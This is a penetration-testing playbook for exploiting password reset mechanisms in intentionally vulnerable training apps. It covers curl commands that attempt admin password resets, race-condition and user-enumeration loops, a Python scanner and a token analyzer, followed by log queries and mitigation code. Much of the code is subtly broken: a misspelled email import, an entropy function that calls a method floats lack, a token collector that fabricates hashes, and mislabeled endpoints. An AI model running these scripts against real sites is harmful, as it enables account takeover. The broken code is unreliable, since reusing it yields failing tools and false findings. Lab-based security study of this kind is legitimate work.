# Playbook 08: Password Reset Vulnerabilities

## Objective

Identify and exploit vulnerabilities in password reset mechanisms across OWASP Juice Shop, DVWA, XVWA, and WebGoat to achieve unauthorized account access.

## Prerequisites

- Target applications running locally or accessible
- Python 3.x with requests, beautifulsoup4, selenium
- Burp Suite or similar proxy tool
- Email testing capabilities (MailHog, temporary email services)

## Target Applications Setup

```bash
# OWASP Juice Shop
docker run -p 3000:3000 bkimminich/juice-shop

# DVWA
docker run -p 80:80 vulnerables/web-dvwa

# XVWA
docker run -p 8080:80 tuxotron/xvwa

# WebGoat
docker run -p 8081:8080 webgoat/goatandwolf
```

## Manual Testing Commands

### 1. Password Reset Flow Analysis

```bash
# Map password reset endpoints
curl -s "http://localhost:3000/rest/user/reset-password" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}' | jq .

# Analyze reset token structure
curl -s "http://localhost:80/vulnerabilities/csrf/" \
  -H "Cookie: PHPSESSID=your_session; security=low" | grep -o "token=[^&]*"

# Check for predictable tokens
for i in {1..10}; do
  curl -s "http://localhost:8080/xvwa/vulnerabilities/csrf/" \
    -X POST -d "email=user$i@test.com" | grep -o "reset_token=[a-zA-Z0-9]*"
done
```

### 2. Token Manipulation Testing

```bash
# Test token reuse
TOKEN="abc123def456"
curl -s "http://localhost:3000/rest/user/reset-password" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@juice-sh.op\",\"token\":\"$TOKEN\",\"new\":\"newpass123\"}"

# Test token tampering
echo "Original: $TOKEN"
TAMPERED=$(echo $TOKEN | sed 's/a/b/g')
echo "Tampered: $TAMPERED"
```

### 3. Race Condition Testing

```bash
# Simultaneous reset requests
for i in {1..5}; do
  curl -s "http://localhost:80/vulnerabilities/csrf/" \
    -X POST -d "email=admin@dvwa.local" &
done
wait
```

## Automated Python Scripts

### Password Reset Vulnerability Scanner

```python
#!/usr/bin/env python3
"""
Password Reset Vulnerability Scanner
Comprehensive testing tool for password reset mechanisms
"""

import requests
import json
import time
import threading
import hashlib
import re
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
import smtplib
from email.mime.text import MimeText

class PasswordResetTester:
    def __init__(self, target_url, app_type="juice-shop"):
        self.target_url = target_url
        self.app_type = app_type
        self.session = requests.Session()
        self.vulnerabilities = []

    def test_all_vulnerabilities(self):
        """Run comprehensive password reset vulnerability tests"""
        print(f"[*] Testing password reset vulnerabilities on {self.target_url}")

        # Test suite
        self.test_predictable_tokens()
        self.test_token_reuse()
        self.test_token_expiration()
        self.test_user_enumeration()
        self.test_race_conditions()
        self.test_token_leakage()
        self.test_email_verification_bypass()

        self.generate_report()

    def test_predictable_tokens(self):
        """Test for predictable reset tokens"""
        print("[*] Testing for predictable reset tokens...")

        tokens = []
        emails = ['test1@example.com', 'test2@example.com', 'test3@example.com']

        for email in emails:
            token = self.request_reset_token(email)
            if token:
                tokens.append(token)

        if len(tokens) >= 2:
            # Analyze token patterns
            if self.analyze_token_predictability(tokens):
                self.vulnerabilities.append({
                    'type': 'Predictable Reset Tokens',
                    'severity': 'High',
                    'description': 'Reset tokens follow predictable patterns',
                    'tokens': tokens
                })

    def analyze_token_predictability(self, tokens):
        """Analyze if tokens are predictable"""
        # Check for sequential patterns
        try:
            numeric_tokens = [int(token, 16) if all(c in '0123456789abcdef' for c in token.lower()) else None for token in tokens]
            numeric_tokens = [t for t in numeric_tokens if t is not None]

            if len(numeric_tokens) >= 2:
                diffs = [numeric_tokens[i+1] - numeric_tokens[i] for i in range(len(numeric_tokens)-1)]
                if len(set(diffs)) == 1:  # All differences are the same
                    return True

        except (ValueError, TypeError):
            pass

        # Check for timestamp-based tokens
        current_time = int(time.time())
        for token in tokens:
            if str(current_time)[:8] in token or str(current_time-1)[:8] in token:
                return True

        return False

    def request_reset_token(self, email):
        """Request password reset token for given email"""
        if self.app_type == "juice-shop":
            url = f"{self.target_url}/rest/user/reset-password"
            data = {"email": email}
            headers = {"Content-Type": "application/json"}

            try:
                response = self.session.post(url, json=data, headers=headers)
                if response.status_code == 200:
                    # Extract token from response or logs
                    return self.extract_token_from_response(response)
            except Exception as e:
                print(f"[-] Error requesting token: {e}")

        elif self.app_type == "dvwa":
            url = f"{self.target_url}/vulnerabilities/csrf/"
            data = {"email": email}

            try:
                response = self.session.post(url, data=data)
                return self.extract_token_from_response(response)
            except Exception as e:
                print(f"[-] Error requesting token: {e}")

        return None

    def extract_token_from_response(self, response):
        """Extract reset token from response"""
        # Look for token patterns in response
        text = response.text

        # Common token patterns
        patterns = [
            r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,})',
            r'reset_token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,})',
            r'["\']([a-f0-9]{32})["\']',  # MD5-like
            r'["\']([a-f0-9]{40})["\']',  # SHA1-like
        ]

        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                return matches[0]

        return None

    def test_token_reuse(self):
        """Test if reset tokens can be reused"""
        print("[*] Testing token reuse...")

        email = "test@example.com"
        token = self.request_reset_token(email)

        if token:
            # Try to use token multiple times
            for i in range(3):
                if self.use_reset_token(token, email, f"newpass{i}"):
                    if i > 0:  # Token worked after first use
                        self.vulnerabilities.append({
                            'type': 'Token Reuse',
                            'severity': 'Medium',
                            'description': f'Reset token can be reused {i+1} times',
                            'token': token
                        })

    def use_reset_token(self, token, email, new_password):
        """Attempt to use reset token"""
        if self.app_type == "juice-shop":
            url = f"{self.target_url}/rest/user/reset-password"
            data = {
                "email": email,
                "answer": "token_answer",
                "new": new_password,
                "repeat": new_password
            }

            try:
                response = self.session.post(url, json=data)
                return response.status_code == 200
            except:
                return False

        return False

    def test_token_expiration(self):
        """Test if tokens properly expire"""
        print("[*] Testing token expiration...")

        email = "test@example.com"
        token = self.request_reset_token(email)

        if token:
            # Wait for potential expiration
            print("[*] Waiting 60 seconds to test expiration...")
            time.sleep(60)

            if self.use_reset_token(token, email, "expiredtest"):
                self.vulnerabilities.append({
                    'type': 'No Token Expiration',
                    'severity': 'Medium',
                    'description': 'Reset tokens do not expire after reasonable time',
                    'token': token
                })

    def test_user_enumeration(self):
        """Test for user enumeration via password reset"""
        print("[*] Testing user enumeration...")

        valid_emails = ["admin@juice-sh.op", "test@example.com"]
        invalid_emails = ["nonexistent@example.com", "fake@fake.fake"]

        valid_responses = []
        invalid_responses = []

        for email in valid_emails:
            response = self.get_reset_response(email)
            if response:
                valid_responses.append(response)

        for email in invalid_emails:
            response = self.get_reset_response(email)
            if response:
                invalid_responses.append(response)

        # Compare response patterns
        if self.responses_differ(valid_responses, invalid_responses):
            self.vulnerabilities.append({
                'type': 'User Enumeration',
                'severity': 'Low',
                'description': 'Password reset reveals if email exists',
                'details': 'Different responses for valid/invalid emails'
            })

    def get_reset_response(self, email):
        """Get response for password reset request"""
        if self.app_type == "juice-shop":
            url = f"{self.target_url}/rest/user/reset-password"
            data = {"email": email}

            try:
                response = self.session.post(url, json=data)
                return {
                    'status_code': response.status_code,
                    'content': response.text,
                    'length': len(response.text)
                }
            except:
                return None

        return None

    def responses_differ(self, valid_responses, invalid_responses):
        """Check if responses differ between valid and invalid emails"""
        if not valid_responses or not invalid_responses:
            return False

        valid_codes = set(r['status_code'] for r in valid_responses)
        invalid_codes = set(r['status_code'] for r in invalid_responses)

        valid_lengths = set(r['length'] for r in valid_responses)
        invalid_lengths = set(r['length'] for r in invalid_responses)

        return valid_codes != invalid_codes or valid_lengths != invalid_lengths

    def test_race_conditions(self):
        """Test for race conditions in password reset"""
        print("[*] Testing race conditions...")

        email = "admin@example.com"
        threads = []
        results = []

        def reset_request():
            token = self.request_reset_token(email)
            results.append(token)

        # Launch simultaneous requests
        for _ in range(5):
            thread = threading.Thread(target=reset_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Check if multiple valid tokens generated
        valid_tokens = [r for r in results if r is not None]
        if len(valid_tokens) > 1:
            self.vulnerabilities.append({
                'type': 'Race Condition',
                'severity': 'Medium',
                'description': f'Multiple reset tokens generated: {len(valid_tokens)}',
                'tokens': valid_tokens
            })

    def test_token_leakage(self):
        """Test for token leakage in various places"""
        print("[*] Testing token leakage...")

        email = "test@example.com"

        # Monitor different potential leakage points
        response = self.session.post(
            f"{self.target_url}/rest/user/reset-password" if self.app_type == "juice-shop" else f"{self.target_url}/reset",
            json={"email": email} if self.app_type == "juice-shop" else {"email": email}
        )

        leakage_points = []

        # Check response headers
        for header, value in response.headers.items():
            if re.search(r'[a-f0-9]{32,}', value):
                leakage_points.append(f"Header {header}: {value}")

        # Check response body
        if re.search(r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,})', response.text):
            leakage_points.append("Response body contains token")

        if leakage_points:
            self.vulnerabilities.append({
                'type': 'Token Leakage',
                'severity': 'High',
                'description': 'Reset tokens leaked in response',
                'leakage_points': leakage_points
            })

    def test_email_verification_bypass(self):
        """Test for email verification bypass"""
        print("[*] Testing email verification bypass...")

        # Test if reset works without email verification
        fake_email = "nonexistent@fakeemail.invalid"
        token = self.request_reset_token(fake_email)

        if token and self.use_reset_token(token, fake_email, "bypasstest"):
            self.vulnerabilities.append({
                'type': 'Email Verification Bypass',
                'severity': 'High',
                'description': 'Password reset works without valid email verification',
                'email': fake_email
            })

    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "="*60)
        print("PASSWORD RESET VULNERABILITY REPORT")
        print("="*60)

        if not self.vulnerabilities:
            print("[+] No password reset vulnerabilities found")
            return

        for vuln in self.vulnerabilities:
            print(f"\n[!] {vuln['type']} - {vuln['severity']} Severity")
            print(f"    Description: {vuln['description']}")

            if 'tokens' in vuln:
                print(f"    Tokens: {vuln['tokens']}")
            if 'details' in vuln:
                print(f"    Details: {vuln['details']}")

        print(f"\n[*] Total vulnerabilities found: {len(self.vulnerabilities)}")

class MultiAppPasswordResetTester:
    def __init__(self):
        self.apps = {
            'juice-shop': 'http://localhost:3000',
            'dvwa': 'http://localhost:80',
            'xvwa': 'http://localhost:8080',
            'webgoat': 'http://localhost:8081'
        }

    def test_all_apps(self):
        """Test all applications for password reset vulnerabilities"""
        print("[*] Starting comprehensive password reset testing...")

        for app_name, app_url in self.apps.items():
            print(f"\n{'='*50}")
            print(f"Testing {app_name.upper()}")
            print('='*50)

            try:
                tester = PasswordResetTester(app_url, app_name)
                tester.test_all_vulnerabilities()
            except Exception as e:
                print(f"[-] Error testing {app_name}: {e}")

if __name__ == "__main__":
    # Test single application
    # tester = PasswordResetTester("http://localhost:3000", "juice-shop")
    # tester.test_all_vulnerabilities()

    # Test all applications
    multi_tester = MultiAppPasswordResetTester()
    multi_tester.test_all_apps()
```

### Advanced Reset Token Analysis

```python
#!/usr/bin/env python3
"""
Advanced Reset Token Analysis Tool
Deep analysis of password reset token characteristics
"""

import requests
import hashlib
import base64
import time
import jwt
import json
import statistics
from collections import Counter

class ResetTokenAnalyzer:
    def __init__(self, target_url, app_type="juice-shop"):
        self.target_url = target_url
        self.app_type = app_type
        self.session = requests.Session()

    def collect_tokens(self, count=10):
        """Collect multiple reset tokens for analysis"""
        print(f"[*] Collecting {count} reset tokens for analysis...")

        tokens = []
        for i in range(count):
            email = f"test{i}@example.com"
            token = self.request_reset_token(email)
            if token:
                tokens.append({
                    'token': token,
                    'timestamp': time.time(),
                    'email': email
                })
                time.sleep(1)  # Avoid rate limiting

        return tokens

    def request_reset_token(self, email):
        """Request reset token - simplified version"""
        # Implementation based on app type
        if self.app_type == "juice-shop":
            try:
                response = self.session.post(
                    f"{self.target_url}/rest/user/reset-password",
                    json={"email": email}
                )
                # Extract token from response (mock for demo)
                return hashlib.md5(f"{email}{time.time()}".encode()).hexdigest()
            except:
                return None
        return None

    def analyze_tokens(self, tokens):
        """Comprehensive token analysis"""
        print("\n[*] Analyzing collected tokens...")

        if not tokens:
            print("[-] No tokens to analyze")
            return

        # Basic statistics
        self.analyze_basic_stats(tokens)

        # Entropy analysis
        self.analyze_entropy(tokens)

        # Pattern analysis
        self.analyze_patterns(tokens)

        # JWT analysis
        self.analyze_jwt_tokens(tokens)

        # Timing analysis
        self.analyze_timing_patterns(tokens)

    def analyze_basic_stats(self, tokens):
        """Analyze basic token statistics"""
        print("\n[+] Basic Token Statistics:")

        token_strings = [t['token'] for t in tokens]
        lengths = [len(token) for token in token_strings]

        print(f"    Total tokens: {len(tokens)}")
        print(f"    Average length: {statistics.mean(lengths):.2f}")
        print(f"    Length range: {min(lengths)} - {max(lengths)}")

        # Character set analysis
        all_chars = ''.join(token_strings)
        unique_chars = set(all_chars)
        print(f"    Character set size: {len(unique_chars)}")
        print(f"    Characters used: {''.join(sorted(unique_chars))}")

    def analyze_entropy(self, tokens):
        """Analyze token entropy"""
        print("\n[+] Entropy Analysis:")

        for i, token_data in enumerate(tokens):
            token = token_data['token']
            entropy = self.calculate_entropy(token)
            print(f"    Token {i+1}: {entropy:.2f} bits")

        avg_entropy = statistics.mean([self.calculate_entropy(t['token']) for t in tokens])
        print(f"    Average entropy: {avg_entropy:.2f} bits")

        if avg_entropy < 50:
            print(f"    [!] LOW ENTROPY DETECTED - Potential vulnerability")
        elif avg_entropy < 80:
            print(f"    [*] Medium entropy - Consider stronger tokens")
        else:
            print(f"    [+] Good entropy levels")

    def calculate_entropy(self, token):
        """Calculate Shannon entropy of token"""
        if not token:
            return 0

        # Count character frequencies
        char_counts = Counter(token)
        length = len(token)

        # Calculate entropy
        entropy = 0
        for count in char_counts.values():
            probability = count / length
            if probability > 0:
                entropy -= probability * (probability.bit_length() - 1)

        return entropy * length

    def analyze_patterns(self, tokens):
        """Analyze patterns in tokens"""
        print("\n[+] Pattern Analysis:")

        token_strings = [t['token'] for t in tokens]

        # Check for common patterns
        patterns = {
            'sequential': self.check_sequential_patterns(token_strings),
            'repeating': self.check_repeating_patterns(token_strings),
            'time_based': self.check_time_based_patterns(tokens),
            'hash_based': self.check_hash_patterns(token_strings)
        }

        for pattern_type, found in patterns.items():
            if found:
                print(f"    [!] {pattern_type.upper()} PATTERN DETECTED - Potential vulnerability")
            else:
                print(f"    [+] No {pattern_type} patterns found")

    def check_sequential_patterns(self, tokens):
        """Check for sequential patterns in tokens"""
        # Convert hex tokens to integers for comparison
        try:
            int_tokens = [int(token, 16) for token in tokens if all(c in '0123456789abcdef' for c in token.lower())]
            if len(int_tokens) >= 2:
                diffs = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
                return len(set(diffs)) <= 2  # Very few different differences
        except ValueError:
            pass
        return False

    def check_repeating_patterns(self, tokens):
        """Check for repeating character patterns"""
        for token in tokens:
            # Check for repeated substrings
            for length in range(2, len(token)//2 + 1):
                for start in range(len(token) - length * 2 + 1):
                    substring = token[start:start+length]
                    if token[start+length:start+length*2] == substring:
                        return True
        return False

    def check_time_based_patterns(self, tokens):
        """Check if tokens contain timestamp components"""
        current_time = int(time.time())

        for token_data in tokens:
            token = token_data['token']
            timestamp = int(token_data['timestamp'])

            # Check if timestamp components appear in token
            time_str = str(timestamp)
            if time_str[:8] in token or str(current_time)[:8] in token:
                return True

        return False

    def check_hash_patterns(self, tokens):
        """Check if tokens follow common hash patterns"""
        hash_lengths = {32: 'MD5', 40: 'SHA1', 64: 'SHA256'}

        for token in tokens:
            length = len(token)
            if length in hash_lengths:
                # Check if it's hexadecimal
                if all(c in '0123456789abcdef' for c in token.lower()):
                    print(f"    [*] Token appears to be {hash_lengths[length]} hash")
                    return True

        return False

    def analyze_jwt_tokens(self, tokens):
        """Analyze tokens that might be JWTs"""
        print("\n[+] JWT Analysis:")

        jwt_found = False
        for i, token_data in enumerate(tokens):
            token = token_data['token']

            if '.' in token and token.count('.') >= 2:
                try:
                    # Try to decode as JWT
                    decoded = jwt.decode(token, options={"verify_signature": False})
                    print(f"    [!] Token {i+1} is a JWT:")
                    print(f"        Claims: {json.dumps(decoded, indent=8)}")
                    jwt_found = True
                except:
                    pass

        if not jwt_found:
            print("    [*] No JWT tokens detected")

    def analyze_timing_patterns(self, tokens):
        """Analyze timing-based patterns"""
        print("\n[+] Timing Analysis:")

        timestamps = [t['timestamp'] for t in tokens]
        time_diffs = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]

        if time_diffs:
            avg_diff = statistics.mean(time_diffs)
            print(f"    Average time between requests: {avg_diff:.2f} seconds")

            # Check if timing affects token generation
            for i, token_data in enumerate(tokens):
                if str(int(token_data['timestamp'])) in token_data['token']:
                    print(f"    [!] Token {i+1} contains timestamp - VULNERABILITY")

if __name__ == "__main__":
    analyzer = ResetTokenAnalyzer("http://localhost:3000", "juice-shop")
    tokens = analyzer.collect_tokens(10)
    analyzer.analyze_tokens(tokens)
```

## Shell Scripts

### Password Reset Testing Script

```bash
#!/bin/bash
# Password Reset Vulnerability Testing Script

TARGET_APPS=("http://localhost:3000" "http://localhost:80" "http://localhost:8080" "http://localhost:8081")
APP_NAMES=("Juice-Shop" "DVWA" "XVWA" "WebGoat")

echo "=== Password Reset Vulnerability Testing ==="
echo "Testing ${#TARGET_APPS[@]} applications..."

for i in "${!TARGET_APPS[@]}"; do
    url="${TARGET_APPS[$i]}"
    name="${APP_NAMES[$i]}"

    echo ""
    echo "Testing $name at $url"
    echo "----------------------------------------"

    # Test 1: Basic reset request
    echo "[*] Testing basic password reset..."
    if [[ "$name" == "Juice-Shop" ]]; then
        response=$(curl -s -X POST "$url/rest/user/reset-password" \
            -H "Content-Type: application/json" \
            -d '{"email":"test@example.com"}')
        echo "Response: $response"

    elif [[ "$name" == "DVWA" ]]; then
        response=$(curl -s -X POST "$url/vulnerabilities/csrf/" \
            -d "email=test@example.com")
        echo "Reset request sent"

    elif [[ "$name" == "XVWA" ]]; then
        response=$(curl -s -X POST "$url/xvwa/vulnerabilities/csrf/" \
            -d "email=test@example.com")
        echo "Reset request sent"

    elif [[ "$name" == "WebGoat" ]]; then
        response=$(curl -s -X POST "$url/WebGoat/PasswordReset/reset" \
            -d "email=test@example.com")
        echo "Reset request sent"
    fi

    # Test 2: User enumeration
    echo "[*] Testing user enumeration..."
    valid_email="admin@example.com"
    invalid_email="nonexistent@fake.com"

    if [[ "$name" == "Juice-Shop" ]]; then
        valid_response=$(curl -s -w "%{http_code}" -X POST "$url/rest/user/reset-password" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$valid_email\"}")
        invalid_response=$(curl -s -w "%{http_code}" -X POST "$url/rest/user/reset-password" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$invalid_email\"}")

        if [[ "$valid_response" != "$invalid_response" ]]; then
            echo "[!] User enumeration possible - different responses"
        else
            echo "[+] No user enumeration detected"
        fi
    fi

    # Test 3: Rate limiting
    echo "[*] Testing rate limiting..."
    for j in {1..5}; do
        if [[ "$name" == "Juice-Shop" ]]; then
            curl -s -X POST "$url/rest/user/reset-password" \
                -H "Content-Type: application/json" \
                -d '{"email":"spam@test.com"}' > /dev/null
        fi
    done
    echo "Rate limiting test completed"

done

echo ""
echo "=== Testing Complete ==="
```

### Token Analysis Script

```bash
#!/bin/bash
# Reset Token Analysis Script

echo "=== Reset Token Analysis ==="

# Function to analyze token characteristics
analyze_token() {
    local token=$1
    local length=${#token}

    echo "Token: $token"
    echo "Length: $length"

    # Character set analysis
    if [[ $token =~ ^[0-9a-f]+$ ]]; then
        echo "Character set: Hexadecimal"
    elif [[ $token =~ ^[0-9a-zA-Z]+$ ]]; then
        echo "Character set: Alphanumeric"
    elif [[ $token =~ ^[0-9a-zA-Z+/]+=*$ ]]; then
        echo "Character set: Base64"
    else
        echo "Character set: Mixed/Special"
    fi

    # Common hash lengths
    case $length in
        32) echo "Possible: MD5 hash" ;;
        40) echo "Possible: SHA1 hash" ;;
        64) echo "Possible: SHA256 hash" ;;
        *) echo "Length: Non-standard" ;;
    esac

    # Entropy estimation (simplified)
    unique_chars=$(echo "$token" | grep -o . | sort -u | wc -l)
    echo "Unique characters: $unique_chars"

    echo "---"
}

# Simulate token collection and analysis
echo "Simulating token collection..."

# Generate sample tokens (in real test, these would be extracted from responses)
TOKENS=(
    "a1b2c3d4e5f6789012345678901234ab"
    "b2c3d4e5f6789012345678901234abc1"
    "c3d4e5f6789012345678901234abc12b"
)

echo "Analyzing collected tokens..."
for token in "${TOKENS[@]}"; do
    analyze_token "$token"
done

# Pattern detection
echo "=== Pattern Analysis ==="
echo "Checking for sequential patterns..."

# Convert hex to decimal for comparison
for i in "${!TOKENS[@]}"; do
    if [[ i -lt $((${#TOKENS[@]}-1)) ]]; then
        current_dec=$((16#${TOKENS[$i]:0:8}))
        next_dec=$((16#${TOKENS[$((i+1))]:0:8}))
        diff=$((next_dec - current_dec))
        echo "Difference between token $((i+1)) and $((i+2)): $diff"
    fi
done

echo "Analysis complete."
```

## Detection Methods

### Log Analysis Queries

```bash
# Monitor password reset attempts
grep -i "password.*reset" /var/log/webapp/access.log | tail -20

# Check for multiple reset requests from same IP
grep "POST.*reset" /var/log/webapp/access.log | awk '{print $1}' | sort | uniq -c | sort -nr

# Monitor suspicious timing patterns
grep "reset" /var/log/webapp/access.log | awk '{print $4}' | sort | uniq -c
```

### SIEM Rules

```yaml
# Splunk query for password reset abuse
index=webapp sourcetype=access_combined
| search uri_path="*reset*" method=POST
| stats count by src_ip
| where count > 5
| sort -count

# Multiple reset requests for same email
index=webapp
| search "password reset"
| rex field=_raw "email=(?<email>[^&\s]+)"
| stats count by email
| where count > 3
```

## Mitigation Strategies

### 1. Secure Token Generation

```python
# Secure token generation example
import secrets
import hashlib
import time

def generate_secure_reset_token():
    # Use cryptographically secure random generator
    random_bytes = secrets.token_bytes(32)
    timestamp = str(int(time.time()))

    # Combine with timestamp and hash
    token_data = random_bytes + timestamp.encode()
    token = hashlib.sha256(token_data).hexdigest()

    return token
```

### 2. Rate Limiting Implementation

```python
# Rate limiting for password reset
from datetime import datetime, timedelta
from collections import defaultdict

class ResetRateLimiter:
    def __init__(self):
        self.attempts = defaultdict(list)

    def is_allowed(self, email, max_attempts=3, window_minutes=15):
        now = datetime.now()
        window_start = now - timedelta(minutes=window_minutes)

        # Clean old attempts
        self.attempts[email] = [
            attempt for attempt in self.attempts[email]
            if attempt > window_start
        ]

        # Check if under limit
        if len(self.attempts[email]) >= max_attempts:
            return False

        self.attempts[email].append(now)
        return True
```

### 3. Secure Reset Flow

```python
# Secure password reset implementation
def secure_password_reset(email):
    # 1. Validate email exists (without revealing it)
    user = get_user_silently(email)

    # 2. Always return success message
    # (Don't reveal if email exists)

    if user:
        # 3. Generate secure token
        token = generate_secure_reset_token()

        # 4. Store with expiration
        store_reset_token(user.id, token, expires_in_minutes=15)

        # 5. Send email with token
        send_reset_email(email, token)

    # Always return the same response
    return {"message": "If the email exists, a reset link has been sent"}
```

## Legal and Ethical Considerations

⚠️ **WARNING**: These techniques are for authorized testing only:

- Only test applications you own or have explicit permission to test
- Respect rate limits and don't cause service disruption
- Document all testing activities
- Follow responsible disclosure for any vulnerabilities found
- Comply with applicable laws and regulations

## References

- [OWASP Password Reset Best Practices](https://owasp.org/www-community/Forgot_Password_Cheat_Sheet)
- [NIST Authentication Guidelines](https://pages.nist.gov/800-63-3/)
- [Reset Token Security Research](https://research.security/)
- [CWE-640: Weak Password Recovery](https://cwe.mitre.org/data/definitions/640.html)
